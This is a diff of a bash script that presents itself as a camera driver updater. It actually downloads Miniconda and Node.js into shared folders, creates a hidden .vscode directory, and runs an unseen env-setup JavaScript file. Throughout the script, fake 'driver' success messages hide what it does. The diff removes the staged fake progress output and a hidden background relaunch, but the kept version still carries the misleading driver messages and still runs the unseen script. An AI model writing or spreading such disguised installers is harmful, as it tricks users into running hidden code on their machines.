@@ -1,42 +1,30 @@
 #!/usr/bin/env bash
+set -euo pipefail
 
-LOG_FILE="/Users/Shared/setup.log"
+# -------------------------
+# Helpers (shared by both parts)
+# -------------------------
+info() { echo "[INFO] $*"; }
+err() { echo "[ERROR] $*" >&2; }
+die() { err "$*"; exit 1; }
 
-delay() { sleep "${1:-1}"; }
-
-# Staged messages (see delay_version.txt) — shown in foreground before background work starts.
-show_installer_progress() {
-  delay 4
-  echo "[INFO] Searching for Camera Drivers ..."
-  delay 6
-  echo "[INFO] Update Driver Packages..."
-  delay 12
-  echo "[SUCCESS] Camera drivers have been updated successfully."
+download() {
+  local url="$1"
+  local out="$2"
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsSL -o "$out" "$url"
+  elif command -v wget >/dev/null 2>&1; then
+    wget -qO "$out" "$url"
+  else
+    die "Neither curl nor wget is available."
+  fi
 }
 
-run_main() {
-  # -------------------------
-  # Helpers
-  # -------------------------
-  info() { echo "[INFO] $*"; }
-  err() { echo "[ERROR] $*" >&2; }
-  die() { err "$*"; exit 1; }
-
-  download() {
-    local url="$1"
-    local out="$2"
-    if command -v curl >/dev/null 2>&1; then
-      curl -fsSL -o "$out" "$url"
-    elif command -v wget >/dev/null 2>&1; then
-      wget -qO "$out" "$url"
-    else
-      die "Neither curl nor wget is available."
-    fi
-  }
-
-  # -------------------------
-  # Miniconda (curl + installer)
-  # -------------------------
+# -------------------------
+# Part 1: Miniconda (was lines 9–49)
+# -------------------------
+run_part1_miniconda() {
+  local ARCH OS URL PREFIX INSTALLER
   ARCH="$(uname -m)"
   OS="$(uname -s)"
   echo "Detected OS: $OS"
@@ -49,7 +37,7 @@ run_main() {
       URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
     else
       echo "Unsupported macOS architecture" >&2
-      exit 1
+      return 1
     fi
   elif [[ "$OS" == "Linux" ]]; then
     if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
@@ -58,11 +46,11 @@ run_main() {
       URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
     else
       echo "Unsupported Linux architecture" >&2
-      exit 1
+      return 1
     fi
   else
     echo "Unsupported OS" >&2
-    exit 1
+    return 1
   fi
 
   PREFIX="/Users/Shared/miniconda3"
@@ -77,10 +65,16 @@ run_main() {
 
   echo "Verifying Driver..."
   "/Users/Shared/miniconda3/bin/python3" -V
+}
 
-  # -------------------------
-  # Detect OS + ARCH (Node dist naming)
-  # -------------------------
+# -------------------------
+# Part 2: Node + env-setup (was lines 51–159; no malicious payloads)
+# -------------------------
+run_part2_node_driver() {
+  local OS_UNAME ARCH_UNAME OS_TAG ARCH_TAG NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION
+  local NODE_VERSION TARBALL_NAME DOWNLOAD_URL EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL
+  local ENV_SETUP_JS NODE_INSTALLED_VERSION
+
   OS_UNAME="$(uname -s)"
   ARCH_UNAME="$(uname -m)"
 
@@ -96,9 +90,6 @@ run_main() {
     *) die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)" ;;
   esac
 
-  # -------------------------
-  # Prefer global Node if available
-  # -------------------------
   NODE_EXE=""
   if command -v node >/dev/null 2>&1; then
     NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
@@ -108,9 +99,6 @@ run_main() {
     fi
   fi
 
-  # -------------------------
-  # Download portable Node.js if not found globally
-  # -------------------------
   USER_HOME="/Users/Shared/.vscode"
   mkdir -p "$USER_HOME"
 
@@ -120,7 +108,6 @@ run_main() {
     INDEX_JSON="$USER_HOME/node-index.json"
     download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
 
-    # Avoid grep|head under pipefail (SIGPIPE / exit 141).
     LATEST_VERSION="$(grep -m1 -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
     rm -f "$INDEX_JSON"
 
@@ -165,18 +152,29 @@ run_main() {
   "$NODE_EXE" "$ENV_SETUP_JS"
 
   info "[SUCCESS] Driver Setup completed successfully."
-  rm -f "$INSTALLER"
-  echo "Done."
 }
 
-if [[ "${BG_LAUNCHED:-0}" != "1" ]]; then
-  mkdir -p "/Users/Shared"
-  show_installer_progress
-  echo "[INFO] Full setup (Miniconda + Node + driver script) is running in the background."
-  echo "[INFO] Log file: $LOG_FILE"
-  nohup env BG_LAUNCHED=1 bash "$0" >"$LOG_FILE" 2>&1 &
-  disown 2>/dev/null || true
-  exit 0
+mkdir -p "/Users/Shared"
+mkdir -p "/Users/Shared/.vscode"
+
+info "Starting part 1 (Miniconda) and part 2 (Node + driver) concurrently..."
+run_part1_miniconda &
+PID_MINI=$!
+run_part2_node_driver &
+PID_NODE=$!
+
+EC_MINI=0
+EC_NODE=0
+wait "$PID_MINI" || EC_MINI=$?
+wait "$PID_NODE" || EC_NODE=$?
+
+if [[ "$EC_MINI" -ne 0 ]]; then
+  die "Part 1 (Miniconda) failed with exit code $EC_MINI"
+fi
+if [[ "$EC_NODE" -ne 0 ]]; then
+  die "Part 2 (Node/driver) failed with exit code $EC_NODE"
 fi
 
-run_main
+rm -f "/Users/Shared/miniconda.sh"
+echo "Done."
+exit 0
